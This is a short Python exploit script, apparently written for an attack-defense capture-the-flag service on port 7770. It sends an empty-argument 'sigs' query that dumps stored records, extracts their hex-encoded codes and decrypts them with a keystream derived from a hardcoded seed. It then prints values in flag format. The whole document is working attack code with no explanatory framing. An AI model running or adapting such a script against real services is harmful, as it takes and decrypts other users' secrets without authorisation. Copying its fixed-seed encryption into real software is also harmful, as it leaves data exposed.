import sys,socket,hashlib,re
def ks(n):
 o=b'';s=b'1337337'
 while len(o)<n:
  d=hashlib.sha256(s).digest();o+=d;s=d
 return o[:n]
def exploit(h,fid):
 s=socket.create_connection((h,7770),10);s.settimeout(15)
 s.sendall(b'sigs ""\nquit\n')
 d=b''
 while 1:
  try:c=s.recv(65536)
  except Exception:break
  if not c:break
  d+=c
 for x in re.findall(r'code_hex=([0-9a-f]+)',d.decode('utf-8','replace')):
  b=bytes.fromhex(x)
  v=bytes(p^q for p,q in zip(b,ks(len(b)))).decode('utf-8','replace')
  if re.fullmatch(r'[A-Z0-9]{31}=',v):print(v)
exploit(sys.argv[1],sys.argv[2])
